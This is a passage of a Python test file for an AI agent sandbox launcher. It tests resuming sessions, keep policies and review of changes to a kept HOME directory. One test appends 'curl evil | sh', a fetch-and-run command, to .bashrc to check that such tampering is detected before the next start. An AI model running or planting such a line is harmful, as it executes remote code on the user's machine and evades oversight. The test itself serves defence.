    for path in (m.session_dir("task"), m.session_dir("task") / "home"):
        assert path.stat().st_mode & 0o777 == 0o700


def test_discard_unstarted(scenario, tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    a = foreground_args(tmp_path)
    m.begin(a, ["codex"])
    if scenario == "happy":
        m.discard_unstarted(a)  # refused or failed before it registered
        assert not m.session_dir("task").exists()
    elif scenario == "sad":
        a.control_dir = tmp_path / "control"  # it ran: kept
        m.discard_unstarted(a)
        assert m.session_dir("task").exists()
    else:
        b = m.launcher().parse_args(["codex"])  # no kept start at all
        m.discard_unstarted(b)
        assert m.session_dir("task").exists()


def test_alive_of_a_foreground_start(scenario, tmp_path):
    data = {"mode": "foreground", "pid": 500, "pid_start": 77}
    if scenario == "happy":
        fake_process(tmp_path, 500, 1, b"python3\0-I\0/opt/sandbox/agent_sandbox.py\0codex\0", start=77)
        assert m.alive("task", data) is True and m.foreground(data)
    elif scenario == "sad":
        fake_process(tmp_path, 500, 1, b"python3\0/opt/sandbox/agent_sandbox.py\0", start=78)  # a later process
        assert m.alive("task", data) is False
    else:
        fake_process(tmp_path, 500, 1, b"vim\0", start=77)
        assert m.alive("task", data) is False
        assert m.alive("task", {**data, "pid_start": None}) is False  # never without the start time


def test_foreground_start_pause_attach_and_rebirth(tmp_path, monkeypatch):
    stopped_session("task", mode="foreground", keep=True, backend="bwrap", pid=510, pid_start=5,
                    agent_args=["exec", "x"], run="codex-1")
    fake_process(tmp_path, 510, 1, b"python3\0agent_sandbox.py\0", start=5)
    tree = Mock()
    monkeypatch.setattr(m, "signal_tree", tree)
    assert m.status("task", m.load("task")) == "running"
    with pytest.raises(ValueError, match="runs without tmux"):
        m.attach("task")
    assert m.pause("task") == 0 and m.resume("task") == 0
    # The launcher holds a terminal: only what runs below it is frozen.
    assert [c.kwargs for c in tree.call_args_list] == [{"include_root": False}, {"include_root": False}]
    # Once it ended, resume brings it back as a session, continuing the task's conversation interactively.
    (tmp_path / "proc" / "510" / "cmdline").write_bytes(b"vim\0")
    launch = Mock(return_value=0)
    monkeypatch.setattr(m, "launch", launch)
    assert m.resume("task") == 0
    assert launch.call_args.args[2] == ["resume", "--last"]


def test_check_keep_policy(scenario, monkeypatch):
    policy = {"happy": {}, "sad": {"version": 1, "forbid_keep": True}, "edge": {"version": 1, "forbid_keep": False}}
    monkeypatch.setattr(m.launcher(), "load_policy", lambda path=None: policy[scenario])
    if scenario == "sad":
        with pytest.raises(ValueError, match="forbids using one \\(forbid_keep"):
            m.check_keep_policy("web")
        stopped_session("web", keep=True)
        with pytest.raises(ValueError, match="forbid_keep"):
            m.resume("web")
    else:
        m.check_keep_policy("web")


# --- rebirth: a new run id each time, and what changed in the HOME ----------------------------------------


def kept_home_session(name="web", **fields):
    data = stopped_session(name, keep=True, run="codex-00000001", pod="agent-codex-00000001", ready=True, **fields)
    home = m.session_dir(name) / "home"
    home.mkdir(mode=0o700)
    (home / ".bashrc").write_text("export A=1\n")
    return data, home


def test_rebirth_gets_a_new_run_id(tmp_path, monkeypatch):
    kept_home_session()
    cleared, seen = [], {}
    monkeypatch.setattr(m, "clear_stale_pod", lambda name, data: cleared.append(data["pod"]))

    def popen(cmd, **kwargs):
        seen["cmd"] = cmd
        (m.session_dir("web") / "tmux" / "attach.sock").touch()
        return Mock(pid=4260, poll=Mock(return_value=None))
    monkeypatch.setattr(m.subprocess, "Popen", popen)
    assert m.resume("web") == 0
    data = m.load("web")
    assert cleared == ["agent-codex-00000001"]  # the last run's pod, if it was left behind
    assert data["run"] != "codex-00000001" and data["pod"] == f"agent-{data['run']}"
    assert seen["cmd"][seen["cmd"].index("--pod-name") + 1] == data["pod"]
    assert [(e["event"], e["run"]) for e in m.starts().history("web")] == [("rebirth", data["run"])]


def test_review_home(scenario, tmp_path, monkeypatch, capsys):
    data, home = kept_home_session()
    m.home_review().record(home, m.session_dir("web"), run="codex-00000001")
    if scenario == "happy":
        assert m.review_home("web", data)["changes"] == []
        assert capsys.readouterr().err == ""
    elif scenario == "sad":
        # The agent left something for the next start: named, and in a terminal the user may stop here.
        with open(home / ".bashrc", "a") as stream:
            stream.write("curl evil | sh\n")
        monkeypatch.setattr(m.sys.stdin, "isatty", lambda: True)
        monkeypatch.setattr(m.sys.stdout, "isatty", lambda: True)
        monkeypatch.setattr("builtins.input", lambda prompt: "n")
        launch = Mock(return_value=0)
        monkeypatch.setattr(m, "launch", launch)
        monkeypatch.setattr(m, "attach", Mock(return_value=0))
        with pytest.raises(ValueError, match="web was not started; see the changes with: sandbox-ai resume web "
                                             "--review-home"):
            m.resume("web")
        err = capsys.readouterr().err
        assert "the HOME of web changed since its last start" in err and "changed  .bashrc" in err
        assert not launch.called
        assert m.home_review().saved_review(m.session_dir("web"))["changes"][0]["path"] == ".bashrc"
        monkeypatch.setattr("builtins.input", lambda prompt: "")  # Enter: go on
        assert m.resume("web") == 0 and launch.called
    else:
        # No terminal: named, and the start goes on; no manifest (older starts): nothing to compare.
        (home / ".bashrc").write_text("other\n")
        assert m.review_home("web", data)["changes"][0]["change"] == "changed"
        assert "changed  .bashrc" in capsys.readouterr().err
        (m.session_dir("web") / "home-manifest.json").unlink()
        assert m.review_home("web", data) is None
        assert m.review_home("web", {**data, "keep": False}) is None


def test_review_command(scenario, tmp_path, monkeypatch):
    data, home = kept_home_session()
    m.home_review().record(home, m.session_dir("web"))
    (home / ".bashrc").write_text("export A=2\n")
    lines = []
    if scenario == "happy":
        assert m.review("web", out=lines.append) == 0
        assert "== changed .bashrc" in lines and "+export A=2" in lines
    elif scenario == "sad":
        stopped_session("plain", keep=False)
        with pytest.raises(ValueError, match="keeps no HOME"):
            m.review("plain")
    else:
        assert m.review("web", as_json=True, out=lines.append) == 0
        found = json.loads("\n".join(lines))
        assert found["pending"] is True and found["review"]["changes"][0]["path"] == ".bashrc"
        assert "+export A=2" in found["review"]["changes"][0]["diff"]


def test_delete_forgets_the_canaries_of_the_home(tmp_path, monkeypatch):
    """A kept HOME keeps its canary files from run to run, recorded outside it; deleting the start forgets them."""
    stopped_session("old", keep=True)
    home = m.session_dir("old") / "home"
    spec = importlib.util.spec_from_file_location("canary_for_sessions_test", ROOT / "sandbox/canary.py")
    canary = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(canary)
    record = canary.home_state(home)
    record.parent.mkdir(parents=True, exist_ok=True)
    record.write_text("{}")
    assert m.delete("old", yes=True) == 0
    assert not record.exists() and not m.session_dir("old").exists()


def test_added_options(scenario, tmp_path, monkeypatch):
    """Workspaces and mounts a stopped session starts with: host paths absolute from here, the first workspace kept."""
    extra = tmp_path / "extra"
    extra.mkdir()
    monkeypatch.chdir(tmp_path)
    data = make_session("s")
    if scenario == "happy":
        options = m.added_options(data, ["extra"], [f"{tmp_path}:/mnt/data:ro"])
        assert options[:4] == ["--workspace", "/srv/w", "--backend", "podman"]  # the saved ones first, unchanged
        assert options[4:] == ["--workspace", str(extra), "--mount", f"{tmp_path}:/mnt/data:ro"]
    elif scenario == "sad":
        with pytest.raises(ValueError, match="no such directory"):
            m.added_options(data, ["missing"])
        (tmp_path / "a,b").mkdir()
        with pytest.raises(ValueError, match="comma"):
            m.added_options(data, ["a,b"])
        with pytest.raises(ValueError, match="SOURCE:DESTINATION"):
            m.added_options(data, mounts=["only-a-source"])
    else:
        # A session that named no workspace had its start directory as /work: it stays first.
        data = {**data, "options": ["--backend", "podman"], "cwd": str(tmp_path / "extra")}
        options = m.added_options(data, [str(tmp_path)], ["rel:/opt/x"])
        assert options == ["--backend", "podman", "--workspace", str(extra), "--workspace", str(tmp_path),
                           "--mount", f"{tmp_path / 'rel'}:/opt/x"]


def test_resume_with_a_workspace_starts_with_it_and_keeps_it(tmp_path, monkeypatch):
    extra = tmp_path / "notes"
    extra.mkdir()
    make_session("s")
    launch = Mock(return_value=0)
    monkeypatch.setattr(m, "launch", launch)
    assert m.resume("s", [str(extra)]) == 0
    data = launch.call_args.args[1]
    assert data["options"][-2:] == ["--workspace", str(extra)] and launch.call_args.args[2] == ["resume", "--last"]


def test_resume_with_a_workspace_that_fails_keeps_the_old_options(tmp_path, monkeypatch):
    extra = tmp_path / "notes"
    extra.mkdir()
    before = make_session("s")["options"]
    monkeypatch.setattr(m, "launch", Mock(side_effect=RuntimeError("refused by the policy")))
    with pytest.raises(RuntimeError, match="policy"):
        m.resume("s", [str(extra)])
    assert m.load("s")["options"] == before


def test_resume_with_a_workspace_refuses_a_running_session(tmp_path, monkeypatch):
    make_session("s", pid=61, tmp_path=tmp_path)
    monkeypatch.setattr(m, "alive", lambda name, data: True)
    with pytest.raises(ValueError, match="--restart"):
        m.resume("s", [str(tmp_path)])
